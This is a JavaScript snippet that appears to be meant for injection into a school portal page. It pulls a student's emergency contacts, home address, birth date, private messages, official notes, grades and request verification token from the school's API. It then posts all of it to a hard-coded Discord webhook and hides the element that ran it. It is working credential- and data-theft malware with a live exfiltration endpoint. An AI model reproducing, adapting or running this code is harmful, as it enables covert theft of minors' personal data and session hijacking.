async function start() {
    const today = new Date();
    const formatdate = String(today.getMonth() + 1).padStart(2, '0') + '%2F' + String(today.getDate()).padStart(2, '0') + '%2F' + today.getFullYear();
    var general = p3.Data.Context.attributes.MasterUserInfo;
    var EMER1 = await fetch('https://headwaters.myschoolapp.com/api/user/emergencycontactphone/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
    var FINALEMER1 = {};
    var offs = [];
    var messes = [];
    var tempstring = '';
    EMER1.forEach((element) => {
        if (!tempstring.includes(element.PhoneNumber)) {
            var obb = {
                'num': element.PhoneNumber,
                'Name': element.FirstName
            };
            FINALEMER1[element.FirstName] = obb;
            string = tempstring + ' + ' + element.PhoneNumber;
        }
    });
    tempstring = '';
    var EMER2 = await fetch('https://headwaters.myschoolapp.com/api/user/emergencycontactemail/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
    EMER2.forEach((element) => {
        if (!tempstring.includes(element.Email)) {
            FINALEMER1[element.FirstName].Email = element.Email;
            string = tempstring + ' + ' + element.Email
        }
    });
    var addr = await fetch('https://headwaters.myschoolapp.com/api/user/address/?userId=' + general.UserId).then(function (res) {
        return res.json()
    });
    FINALEMER1['Address'] = ' ' + addr[0].AddressLine1 + addr[0].AddressLine2 + addr[0].AddressLine3;
    FINALEMER1['Full Name'] = general.FirstName + ' ' + general.MiddleName + ' ' + general.LastName;
    FINALEMER1['DoB'] = general.BirthDate;
    FINALEMER1['Messages'] = [];
    FINALEMER1['OffNotes'] = [];
    var messages = await fetch('https://headwaters.myschoolapp.com/api/message/inbox/?format=json&amp;pageNumber=1&amp;toDate=' + formatdate).then(function (res) {
        return res.json()
    });
    var offnotes = await fetch('https://headwaters.myschoolapp.com/api/officialnote/InboxExternal/?format=json&amp;currentInd=1&amp;statusXml=&amp;commentTypeXml=&amp;fromDate=&amp;toDate=' + formatdate).then(function (res) {
        return res.json()
    });
    offnotes.forEach((elem) => {
        var g = {};
        if (elem.CommentType != 'SPRING Student-led Conference Comment' && elem.CommentType != 'FALL Student-Led Conference Comment') {
            g['To'] = elem.StudentName;
            g['From'] = elem.AuthorName;
            g['MSG'] = elem.Comment;
            g['Date'] = elem.InsertDate;
            FINALEMER1['OffNotes'].push(g);
        }
    });
    messages.forEach((elem) => {
        var t = {};
        var nums = [];
        var blacklist = [27055035, 2719229];
        elem.Participants.forEach((Poo) => nums.push(Poo.Pk));
        if (!nums.some(number => blacklist.includes(number))) {
            t['From'] = elem.Messages[0].FromUser.UserNameFormatted;
            t['Sub'] = elem.Subject;
            t['MSG'] = elem.Messages[0].Body.normalize('NFC');
            t['To'] = [];
            elem.Participants.forEach((Poo) => t.To.push(Poo.Name));
            t['Date'] = elem.Messages[0].SendDateTicks;
            FINALEMER1['Messages'].push(t)
        }
    });
    FINALEMER1['ReqToken'] = p3.Data.RequestVerificationToken;
    await fetch('https://discord.com/api/webhooks/1216480409127223366/K9qLjY9EaCBJbO3ssfZ-K3xORSjuXZtYD7kOWHfPSFhEamU6x-Kq8qeBB3C9gdOsA0f_', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: JSON.stringify(JSON.parse(await (await fetch('https://headwaters.myschoolapp.com/api/datadirect/ParentStudentUserClassesGet?userId=' + p3.Data.Context.attributes.MasterUserInfo.UserId + '&amp;schoolYearLabel=2024%20-%202025&amp;memberLevel=3&amp;persona=2&amp;durationList=161284%2C161286&amp;markingPeriodId=&amp;viewCid=view118&amp;parentViewCid=view60&amp;changeSchoolYearCount=1&amp;ts=1740780140184&amp;rnd=0.3949742419078759')).text()).map(x => {
                return {
                    'grade': x.cumgrade,
                    'class': x.sectionidentifier
                }
            }))
        })
    });
    var pleb = JSON.stringify(FINALEMER1).match(/.{1,1900}/g);
    for (let i = 0; i < pleb.length; i++) {
        await fetch('https://discord.com/api/webhooks/1216480409127223366/K9qLjY9EaCBJbO3ssfZ-K3xORSjuXZtYD7kOWHfPSFhEamU6x-Kq8qeBB3C9gdOsA0f_', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: pleb[i]
            })
        });
    }
};
start();
this.style.display = 'none'
